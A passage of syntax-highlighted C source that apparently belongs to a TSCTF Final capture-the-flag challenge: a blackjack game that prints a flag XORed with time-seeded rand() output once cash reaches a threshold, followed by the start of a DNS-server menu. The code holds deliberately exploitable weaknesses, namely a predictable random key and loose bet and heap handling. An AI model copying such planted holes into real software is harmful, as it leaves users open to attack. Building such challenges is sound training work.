(Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span> <span class="comment">//Displays Spade Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">   <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  %d  |\n"</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  J  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  A  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  Q  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|%c    |\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|  K  |\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"|    %c|\n"</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------\n"</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span> <span class="comment">//Generates random card</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">                </span><br><span class="line">    <span class="comment">// srand((unsigned) time(NULL)); //Generates random seed for rand() function</span></span><br><span class="line">     random_card = rand()%<span class="number">4</span>+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">1</span>)</span><br><span class="line">     &#123;   </span><br><span class="line">         clubcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">2</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         diamondcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">3</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         heartcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">          </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">4</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         spadecard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;    </span><br><span class="line">     <span class="keyword">return</span> l;</span><br><span class="line">&#125; <span class="comment">// End Function   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="comment">//Plays game</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">int</span> p=<span class="number">0</span>; <span class="comment">// holds value of player_total</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">1</span>; <span class="comment">// counter for asking user to hold or stay (aka game turns)</span></span><br><span class="line">     <span class="keyword">char</span> choice3;</span><br><span class="line">     player_total=<span class="number">0</span>;</span><br><span class="line">     dealer_total=<span class="number">0</span>;</span><br><span class="line">     cash = cash;</span><br><span class="line">     cash_test();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nCash: $%d\n"</span>,cash); <span class="comment">//Prints amount of cash user has</span></span><br><span class="line">     randcard(); <span class="comment">//Generates random card</span></span><br><span class="line">     player_total = p + l; <span class="comment">//Computes player total</span></span><br><span class="line">     p = player_total;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p); <span class="comment">//Prints player total</span></span><br><span class="line">     dealer(); <span class="comment">//Computes and prints dealer total</span></span><br><span class="line">     betting(); <span class="comment">//Prompts user to enter bet amount</span></span><br><span class="line">        </span><br><span class="line">     <span class="keyword">while</span>(i&lt;=<span class="number">21</span>) <span class="comment">//While loop used to keep asking user to hit or stay at most twenty-one times</span></span><br><span class="line">                  <span class="comment">//  because there is a chance user can generate twenty-one consecutive 1's</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(p==<span class="number">21</span>) <span class="comment">//If user total is 21, win</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">             won = won+<span class="number">1</span>;</span><br><span class="line">             cash = cash+bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&gt;<span class="number">21</span>) <span class="comment">//If player total is over 21, loss</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nWoah Buddy, You Went WAY over.\n"</span>);</span><br><span class="line">             loss = loss+<span class="number">1</span>;</span><br><span class="line">             cash = cash - bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&lt;=<span class="number">21</span>) <span class="comment">//If player total is less than 21, ask to hit or stay</span></span><br><span class="line">         &#123;         </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"\n\nWould You Like to Hit or Stay?"</span>);</span><br><span class="line">              </span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">"%c"</span>, &amp;choice3);</span><br><span class="line">             <span class="keyword">while</span>((choice3!=<span class="string">'H'</span>) &amp;&amp; (choice3!=<span class="string">'h'</span>) &amp;&amp; (choice3!=<span class="string">'S'</span>) &amp;&amp; (choice3!=<span class="string">'s'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">             &#123;                                                                           </span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"Please Enter H to Hit or S to Stay.\n"</span>);</span><br><span class="line">                 <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice3);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'H'</span>) || (choice3==<span class="string">'h'</span>)) <span class="comment">// If Hit, continues</span></span><br><span class="line">             &#123; </span><br><span class="line">                 randcard();</span><br><span class="line">                 player_total = p + l;</span><br><span class="line">                 p = player_total;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"\nYour Total is %d\n"</span>, p);</span><br><span class="line">                 dealer();</span><br><span class="line">                  <span class="keyword">if</span>(dealer_total==<span class="number">21</span>) <span class="comment">//Is dealer total is 21, loss</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">                      loss = loss+<span class="number">1</span>;</span><br><span class="line">                      cash = cash - bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125; </span><br><span class="line">      </span><br><span class="line">                  <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer total is over 21, win</span></span><br><span class="line">                  &#123;                      </span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nDealer Has Went Over!. You Win!\n"</span>);</span><br><span class="line">                      won = won+<span class="number">1</span>;</span><br><span class="line">                      cash = cash+bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">'S'</span>) || (choice3==<span class="string">'s'</span>)) <span class="comment">// If Stay, does not continue</span></span><br><span class="line">             &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"\nYou Have Chosen to Stay at %d. Wise Decision!\n"</span>, player_total);</span><br><span class="line">                stay();</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">             i++; <span class="comment">//While player total and dealer total are less than 21, re-do while loop </span></span><br><span class="line">     &#125; <span class="comment">// End While Loop</span></span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span> <span class="comment">//Function to play for dealer AI</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> z;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(dealer_total&lt;<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">    <span class="comment">//  srand((unsigned) time(NULL) + 1); //Generates random seed for rand() function</span></span><br><span class="line">      z=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(z&lt;=<span class="number">10</span>) <span class="comment">//If random number generated is 10 or less, keep that value</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=z;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z&gt;<span class="number">11</span>) <span class="comment">//If random number generated is more than 11, change value to 10</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=<span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z==<span class="number">11</span>) <span class="comment">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(dealer_total&lt;=<span class="number">10</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     dealer_total = dealer_total + d;</span><br><span class="line">     &#125;</span><br><span class="line">           </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nThe Dealer Has a Total of %d"</span>, dealer_total); <span class="comment">//Prints dealer total</span></span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span> <span class="comment">//Function for when user selects 'Stay'</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     dealer(); <span class="comment">//If stay selected, dealer continues going</span></span><br><span class="line">     <span class="keyword">if</span>(dealer_total&gt;=<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(player_total&gt;=dealer_total) <span class="comment">//If player's total is more than dealer's total, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer's total is more than 21, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nUnbelievable! You Win!\n"</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;      </span><br><span class="line">      <span class="keyword">if</span>(player_total&lt;dealer_total) <span class="comment">//If player's total is less than dealer's total, loss</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nDealer Has the Better Hand. You Lose.\n"</span>);</span><br><span class="line">         loss = loss+<span class="number">1</span>;</span><br><span class="line">         cash = cash - bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"\nYou have %d Wins and %d Losses. Awesome!\n"</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         stay();</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span> <span class="comment">//Test for if user has cash remaining in purse</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (cash &lt;= <span class="number">0</span>) <span class="comment">//Once user has zero remaining cash, game ends and prompts user to play again</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"You Are Bankrupt. Game Over"</span>);</span><br><span class="line">        <span class="comment">//cash = 500;</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">//askover();</span></span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">if</span>(cash&gt;=WIN_SUM)&#123;</span><br><span class="line">     <span class="keyword">int</span> id;</span><br><span class="line">     <span class="keyword">int</span> length;</span><br><span class="line">     <span class="keyword">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">     <span class="keyword">char</span> *key=<span class="number">0</span>;</span><br><span class="line">     id = open(<span class="string">"/home/tsctf/flag/flag"</span>,O_RDONLY,S_IRUSR );</span><br><span class="line">     <span class="keyword">if</span>(id &lt;<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"flag file error~!\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     length = read(id,buffer,<span class="number">100</span>);</span><br><span class="line">     <span class="keyword">if</span> (length&lt;<span class="number">0</span>)&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"read error~!\n"</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     buffer[length] = <span class="string">'\0'</span>;</span><br><span class="line">     length = <span class="built_in">strlen</span>(buffer);</span><br><span class="line">     key = <span class="built_in">malloc</span>(length);</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt;length;i++)&#123;</span><br><span class="line">     <span class="comment">//printf("%d ",key[i*4]);</span></span><br><span class="line">     key[i]=(rand()%<span class="number">256</span>);</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">//printf("%d",(length/4)*4);</span></span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i&lt;length;i++)&#123;</span><br><span class="line">     <span class="comment">//printf("%2x",key[i]);</span></span><br><span class="line">     buffer[i] = buffer[i]^key[i];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"d(`･∀･)b:"</span>);</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"OK, you win,"</span>);</span><br><span class="line">     <span class="built_in">puts</span>(<span class="string">"I won't give u real flag :"</span>);</span><br><span class="line">        write(<span class="number">1</span>,buffer,length);</span><br><span class="line">     close(id);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"\n\nEnter Bet: $"</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">while</span> ((bet &gt; cash) || (bet == <span class="number">0</span>))<span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nAre you kidding me? "</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nEnter Bet: "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%u"</span>, &amp;bet);</span><br><span class="line">        <span class="comment">//return bet;</span></span><br><span class="line"> &#125;</span><br><span class="line"><span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to play again</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">         </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nWould You Like To Play Again?"</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">"\nPlease Enter Y for Yes or N for No\n"</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">'Y'</span>) &amp;&amp; (choice1!=<span class="string">'y'</span>) &amp;&amp; (choice1!=<span class="string">'N'</span>) &amp;&amp; (choice1!=<span class="string">'n'</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Incorrect Choice. Please Enter Y for Yes or N for No.\n"</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">'Y'</span>) || (choice1 == <span class="string">'y'</span>)) <span class="comment">// If yes, continue.</span></span><br><span class="line">    &#123; </span><br><span class="line">          <span class="comment">//  system("clear");</span></span><br><span class="line">            play();</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((choice1 == <span class="string">'N'</span>) || (choice1 == <span class="string">'n'</span>)) <span class="comment">// If no, exit program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//fileresults();</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nBYE!!!!\n\n"</span>);</span><br><span class="line">        <span class="comment">//system("pause");</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fileresults</span><span class="params">()</span> <span class="comment">//Prints results into Blackjack.txt file in program directory</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fpresults; <span class="comment">//File pointer is fpresults</span></span><br><span class="line">    fpresults = fopen(RESULTS, <span class="string">"w"</span>); <span class="comment">//Creates file and writes into it</span></span><br><span class="line">    <span class="keyword">if</span>(fpresults == <span class="literal">NULL</span>) <span class="comment">// what to do if file missing from directory</span></span><br><span class="line">    &#123;</span><br><span class="line">               <span class="built_in">printf</span>(<span class="string">"\nError: File Missing\n"</span>);</span><br><span class="line">               <span class="comment">//system("pause");</span></span><br><span class="line">               <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;     </span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t RESULTS"</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\n\t---------\n"</span>);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Won %d Times\n"</span>, won);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nYou Have Lost %d Times\n"</span>, loss);</span><br><span class="line">     <span class="built_in">fprintf</span>(fpresults,<span class="string">"\nKeep Playing and Set an All-Time Record!"</span>);</span><br><span class="line">    &#125; </span><br><span class="line">     fclose(fpresults);</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[-] Time out ... \n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *logo =</span><br><span class="line"><span class="string">"*******************************************\n"</span></span><br><span class="line"><span class="string">"*  _____   _____   _____   _____   _____  *\n"</span>    </span><br><span class="line"><span class="string">"* |_   _| /  ___/ /  ___| |_   _| |  ___| *\n"</span>    </span><br><span class="line"><span class="string">"*   | |   | |___  | |       | |   | |__   *\n"</span></span><br><span class="line"><span class="string">"*   | |   \\___  \\ | |       | |   |  __|  *\n"</span>   </span><br><span class="line"><span class="string">"*   | |    ___| | | |___    | |   | |     *\n"</span></span><br><span class="line"><span class="string">"*   |_|   /_____/ \\_____|   |_|   |_|     *\n"</span> </span><br><span class="line"><span class="string">"*                                         *\n"</span></span><br><span class="line"><span class="string">"* ------ Welcome to TSCTF FINAL --------- *\n"</span></span><br><span class="line"><span class="string">"* ------     Have a nice day    --------- *\n"</span></span><br><span class="line"><span class="string">"*  _____   _   __   _       ___   _       *\n"</span>      </span><br><span class="line"><span class="string">"* |  ___| | | |  \\ | |     /   | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* | |__   | | |   \\| |    / /| | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* |  __|  | | | |\\   |   / / | | | |      *\n"</span>     </span><br><span class="line"><span class="string">"* | |     | | | | \\  |  / /  | | | |___   *\n"</span>  </span><br><span class="line"><span class="string">"* |_|     |_| |_|  \\_| /_/   |_| |_____|  *\n"</span></span><br><span class="line"><span class="string">"*******************************************\n"</span></span><br><span class="line"><span class="string">"\n"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(logo);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    signal(<span class="number">14</span>,handler);</span><br><span class="line">alarm(<span class="number">200</span>);</span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)/<span class="number">60</span>);</span><br><span class="line">    visitor_name = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(visitor_name,<span class="string">"anonym"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"==GOD.ZE DNS Server=="</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"1. Login"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"2. Add a DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"3. Parsing domain names "</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"4. Delete  DNS item"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"5. 